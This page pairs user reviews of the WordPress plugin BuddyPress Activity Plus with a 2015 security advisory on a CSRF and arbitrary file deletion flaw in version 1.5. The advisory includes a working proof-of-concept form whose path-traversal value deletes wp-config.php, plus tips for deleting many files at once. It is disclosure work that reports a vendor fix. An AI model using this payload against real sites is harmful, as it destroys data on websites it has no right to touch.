I like how it just works and adds nice stuff.
A bit too simple for my taste though.
But if you only want the minimum functionality, then this plugin is a perfect no-bloat solution.
I couldn’t bring myself to delete it though….
I’m so keeping BAP as a reliable plan B.

Installed this, However the use of inline styling makes it nearly impossible to customise or fit with my theme’s look and feel.
For this reason it’s pretty useless.

I’d like to use this plugin within Buddypress. But the function that should show a facebook-like teaser of a webpage link to be shared only works for users who have admin rights. Otherwise the preview can be seen, but after clicking on “add link” nothing happens. To normal users this appears like a real bug.
I can’t tell this to WP MU DEV because before being able to get in contact I’d have to enter my credit card number into their website which I definitely don’t want.
I’m also missing a better coordination with the oembed function of Buddypress. Normal users will not understand why some (whitelisted) websites show a teaser after merely entering the URL into the message field while other websites need to be shared by the link sharing function of BuddyPress Activity Plus. It would be much better usability if there was some kind of “silent mode”: If the message entered into the message field contains a link that is not on the whitelist of oembed BuddyPress Activity Plus could create a teaser out of this link (by reading the OG-Tags, similar to Facebook). This would be much easier to understand for normal users of a Buddypress site.

## Advisory:

# CSRF and arbitrary file deletion in BuddyPress Activity Plus 1.5

## Vulnerability

Last revised: July 13, 2015

An attacker can delete any file the PHP process can delete.

For this to happen, a logged-in user would have to be tricked into clicking on a link controlled by the attacker. It is easy to make these links very convincing.

Current state:
 Fixed

## CVSS Summary

CVSS base scores for this vulnerability
| Score 8.5 High | |
| --- | --- |
| Vector | Network |
| Complexity | Low |
| Authentication | None |
| Confidentiality | None |
| Integrity | Partial |
| Availability | Complete |

You can read more about CVSS base scores on [Wikipedia](http://en.wikipedia.org/wiki/CVSS) or in the [CVSS specification](http://www.first.org/cvss/cvss-guide).

## Proof of concept

Ensure your PHP user can do maximum damage:

```
sudo chown www-data:www-data /var/vhosts/my-wordpress-site
```

Visit a page containing this as a logged-in user and click submit:

```
<form method="POST" action="http://localhost/wp-admin/admin-ajax.php">
  <input type="text" name="action" value="bpfb_remove_temp_images">
  <input type="text" name="data" value="bpfb_photos[]=../../../../wp-config.php">
  <input type="submit">
</form>
```

If the server is set up so that the php user has more restricted permissions, then an attacker will at least be able to delete files from the uploads directory.

Note that you can also delete as many things as you like at once – $\_POST[‘data’] is run through parse\_str() which parses it as a query string, so just keep adding “&bpfb\_photos[]=path/to/file” to the end until you have all known files.

There is an identical attack available only when BP Group Documents is also installed. Just replace “bpfb\_remove\_temp\_images” with “bpfb\_remove\_temp\_documents” and in data replace “bpfb\_photos” with “bpfb\_documents”.

* 2015-07-13: Vendor responded
* 2015-07-14: Vendor reported issue fixed
* 2015-07-14: Published

## Mitigation/further actions

Upgrade to version 1.6.2 or later

If this is not possible, ensure that the PHP user on the server does not have permission to delete files like wp-config.php.
